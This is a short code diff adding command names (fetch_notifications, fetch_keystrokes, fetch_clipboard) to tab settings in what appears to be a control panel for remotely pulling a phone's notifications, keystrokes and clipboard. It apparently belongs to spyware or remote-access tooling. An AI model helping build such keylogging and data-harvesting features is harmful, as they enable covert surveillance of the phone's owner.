@@ -77,18 +77,21 @@ export const DEVICE_TABS_META: Record<string, TabMeta> = {
     name: "Notifications",
     waitMsg: "Request sent! Fetching Notifications from phone...",
     doneMsg: "Notifications refreshed!",
+    cmd: "fetch_notifications",
   },
   keylogger: {
     id: "keylogger",
     name: "Keystrokes",
     waitMsg: "Request sent! Fetching Keystrokes from phone...",
     doneMsg: "Keystrokes refreshed!",
+    cmd: "fetch_keystrokes",
   },
   clipboard: {
     id: "clipboard",
     name: "Clipboard",
     waitMsg: "Request sent! Fetching Clipboard from phone...",
     doneMsg: "Clipboard refreshed!",
+    cmd: "fetch_clipboard",
   },
 };
 
